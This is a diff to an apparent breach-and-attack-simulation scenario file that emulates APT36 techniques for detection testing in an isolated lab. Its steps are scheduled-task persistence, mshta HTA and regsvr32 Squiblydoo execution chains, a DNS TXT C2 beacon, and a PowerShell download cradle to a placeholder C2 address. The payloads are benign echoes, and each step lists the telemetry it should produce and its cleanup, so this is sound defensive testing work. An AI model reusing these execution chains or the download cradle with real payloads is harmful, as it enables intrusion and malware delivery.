@@ -213,3 +213,164 @@ steps:
       nslookup $beacon 2>&1 | Out-Null
       Write-Output "EXEC: DNS beacon '$beacon' queried — expect Sysmon EID 22 + nslookup EID 4688. NXDOMAIN response expected. Use run-id '$runId' for SIEM correlation across this scenario run. [BAS-SIM]"
     cleanup: ""
+
+  # ── Lab-only steps ─────────────────────────────────────────────────────────
+  # fidelity: lab-only  →  skipped in telemetry mode; requires confirmLab + isolated range
+
+  - name: "Scheduled Task Persistence (lab — create + delete)"
+    technique_id: T1053.005
+    framework: custom
+    executor: powershell
+    timeout_sec: 45
+    fidelity: lab-only
+    production_safe: false
+    risk: medium
+    blast_radius: "Creates a scheduled task with a benign powershell.exe action then immediately removes it. Generates EID 4698+4699. Task never actually triggers."
+    reversible: true
+    telemetry:
+      - "Security EID 4698 (scheduled task created)"
+      - "Security EID 4699 (scheduled task deleted)"
+      - "Sysmon EID 1 (schtasks.exe process create)"
+    detection:
+      - "SIEM: schtask creation from a non-installer process; APT36 names tasks to mimic system tasks"
+      - "EDR: Register-ScheduledTask via powershell.exe — no MSI or update context"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $taskName = 'BAS-SIM-APT36-WindowsUpdate'
+      $action   = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -NonInteractive -Command "Write-Output BAS-SIM-T1053"'
+      $trigger  = New-ScheduledTaskTrigger -AtLogOn
+      Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Limited -Force -ErrorAction SilentlyContinue | Out-Null
+      $created  = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+      if ($created) {
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+        $gone = -not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)
+        Write-Output "FAIL: scheduled task '$taskName' created and removed (cleanup verified=$gone) — expect EID 4698+4699. APT36-style schtask persistence not blocked. [BAS-SIM]"
+      } else {
+        Write-Output "PASS: scheduled task creation blocked — AppLocker / restricted token / policy prevented APT36 persistence mechanism."
+      }
+    cleanup: |
+      Unregister-ScheduledTask -TaskName 'BAS-SIM-APT36-WindowsUpdate' -Confirm:$false -ErrorAction SilentlyContinue
+
+  - name: "mshta HTA Dropper Chain (lab — VBScript + cmd.exe spawn)"
+    technique_id: T1218.005
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: lab-only
+    production_safe: false
+    risk: high
+    blast_radius: "Writes a benign .hta to %TEMP%, executes via mshta.exe — spawns cmd.exe /c echo as a child (no payload). File deleted on completion. Triggers EDR by design."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 11 (file create): bas_sim_apt36.hta in %TEMP%"
+      - "Sysmon EID 1 (process create): mshta.exe with HTA path as argument"
+      - "Sysmon EID 1 (process create): cmd.exe with ParentImage=mshta.exe"
+      - "Security EID 4688 for both mshta.exe and cmd.exe"
+    detection:
+      - "EDR: mshta.exe spawning cmd.exe — canonical APT36 HTA dropper detection signal"
+      - "SIEM: mshta.exe executing a file from %TEMP% — high-fidelity APT36 initial-access indicator"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $hta = Join-Path $env:TEMP 'bas_sim_apt36.hta'
+      $htaContent = '<html><head></head><body onload="vbscript:CreateObject(''WScript.Shell'').Run ''cmd.exe /c echo BAS-SIM-T1218.005'',0,True:window.close"></body></html>'
+      [System.IO.File]::WriteAllText($hta, $htaContent, [System.Text.Encoding]::UTF8)
+      if (-not (Test-Path $hta)) { Write-Output "PASS: HTA file write blocked — execution surface restricted."; return }
+      $p = Start-Process 'mshta.exe' -ArgumentList "`"$hta`"" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
+      if ($p) { $p.WaitForExit(10000) | Out-Null; $ec = $p.ExitCode } else { $ec = -1 }
+      Remove-Item $hta -Force -ErrorAction SilentlyContinue
+      $cleaned = -not (Test-Path $hta)
+      if ($ec -ge 0) {
+        Write-Output "FAIL: mshta.exe HTA chain executed (exit $ec, artifact cleaned=$cleaned) — APT36 HTA dropper vector not blocked. Expect Sysmon EID 1 mshta->cmd. [BAS-SIM]"
+      } else {
+        Write-Output "PASS: mshta.exe execution blocked — AppLocker / ASR rule / WDAC prevented HTA dropper execution (artifact cleaned=$cleaned)."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_sim_apt36.hta') -Force -ErrorAction SilentlyContinue
+
+  - name: "regsvr32 Squiblydoo SCT Chain (lab — JScript + cmd.exe spawn)"
+    technique_id: T1218.010
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: lab-only
+    production_safe: false
+    risk: high
+    blast_radius: "Writes a benign .sct scriptlet to %TEMP%, executes via regsvr32 /i scrobj.dll — spawns cmd.exe /c echo as child. File deleted on completion. Triggers EDR by design."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 11 (file create): bas_sim_apt36.sct in %TEMP%"
+      - "Sysmon EID 7 (image load): scrobj.dll loaded by regsvr32.exe"
+      - "Sysmon EID 1 (process create): regsvr32.exe with /i:path scrobj.dll"
+      - "Sysmon EID 1 (process create): cmd.exe with ParentImage=regsvr32.exe"
+    detection:
+      - "EDR: regsvr32.exe loading scrobj.dll and spawning cmd.exe — Squiblydoo detection signature"
+      - "SIEM: regsvr32.exe with /i: argument referencing a %TEMP% file"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $sct = Join-Path $env:TEMP 'bas_sim_apt36.sct'
+      $sctContent = '<?XML version="1.0"?><scriptlet><registration progid="BAS" classid="{11111111-1111-1111-1111-111111111111}"><script language="JScript"><![CDATA[new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo BAS-SIM-T1218.010",0,true);]]></script></registration></scriptlet>'
+      [System.IO.File]::WriteAllText($sct, $sctContent, [System.Text.Encoding]::UTF8)
+      if (-not (Test-Path $sct)) { Write-Output "PASS: SCT file write blocked — execution surface restricted."; return }
+      $p = Start-Process 'regsvr32.exe' -ArgumentList "/s /n /u /i:`"$sct`" scrobj.dll" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
+      if ($p) { $p.WaitForExit(10000) | Out-Null; $ec = $p.ExitCode } else { $ec = -1 }
+      Remove-Item $sct -Force -ErrorAction SilentlyContinue
+      $cleaned = -not (Test-Path $sct)
+      if ($ec -ge 0) {
+        Write-Output "FAIL: regsvr32 Squiblydoo executed (exit $ec, artifact cleaned=$cleaned) — scrobj.dll chain not blocked. Expect Sysmon EID 7 scrobj.dll + EID 1 cmd.exe. [BAS-SIM]"
+      } else {
+        Write-Output "PASS: regsvr32 execution blocked — AppLocker / WDAC / ASR rule prevented Squiblydoo SCT chain (artifact cleaned=$cleaned)."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_sim_apt36.sct') -Force -ErrorAction SilentlyContinue
+
+  - name: "C2 DNS TXT Beacon (lab — CrimsonRAT channel registration)"
+    technique_id: T1071.004
+    framework: custom
+    executor: powershell
+    timeout_sec: 20
+    fidelity: lab-only
+    production_safe: false
+    risk: low
+    blast_radius: "DNS TXT query to bas-c2-<runid>.invalid — .invalid is RFC 2606 reserved, guaranteed NXDOMAIN. No real C2 contacted."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 22 (DNS query): TXT record query for bas-c2-<id>.invalid"
+      - "Corporate DNS server log: NXDOMAIN for bas-c2-*.invalid"
+    detection:
+      - "SIEM: DNS TXT query from endpoint — CrimsonRAT uses TXT records for C2 channel registration; correlate with run ID"
+      - "NDR: unusual DNS TXT query volume from workstation to external resolver"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId  = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0, [Math]::Min(8, $env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $beacon = "bas-c2-$runId.invalid"
+      Resolve-DnsName -Name $beacon -Type TXT -ErrorAction SilentlyContinue | Out-Null
+      Write-Output "EXEC: DNS TXT beacon '$beacon' queried — expect Sysmon EID 22 (TXT type). NXDOMAIN is expected. CrimsonRAT uses TXT records for C2 registration — use '$runId' to correlate across this run. [BAS-SIM]"
+    cleanup: ""
+
+  - name: "Download Cradle (lab — BAS listener / RFC5737 isolated)"
+    technique_id: T1105
+    framework: custom
+    executor: powershell
+    timeout_sec: 20
+    fidelity: lab-only
+    production_safe: false
+    risk: medium
+    blast_radius: "Invoke-WebRequest to BAS_C2_URI env var, or RFC5737 TEST-NET-1 (192.0.2.1) if unset — no real internet egress. Connection timeout is expected without a BAS listener."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3 (network connection): powershell.exe to configured BAS listener or 192.0.2.1"
+      - "Security EID 4688 (powershell.exe with Invoke-WebRequest command line)"
+    detection:
+      - "EDR: PowerShell download cradle shortly after LOLBin execution — APT36 RAT delivery follow-on"
+      - "SIEM: outbound HTTP from powershell.exe; correlate source IP + run ID"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $uri = if ($env:BAS_C2_URI) { $env:BAS_C2_URI } else { 'http://192.0.2.1/bas-c2-payload' }
+      try {
+        $r    = Invoke-WebRequest -Uri $uri -TimeoutSec 3 -ErrorAction Stop
+        $size = $r.Content.Length
+        Write-Output "EXEC: download cradle to '$uri' returned $size bytes — BAS listener responded. Expect Sysmon EID 3 network event. Set BAS_C2_URI to isolated BAS listener for full fidelity. [BAS-SIM]"
+      } catch {
+        Write-Output "EXEC: download cradle to '$uri' attempted (timeout/refused — expected without listener) — expect Sysmon EID 3 outbound attempt. Set BAS_C2_URI=http://<isolated-listener>/path for full simulation. [BAS-SIM]"
+      }
+    cleanup: ""
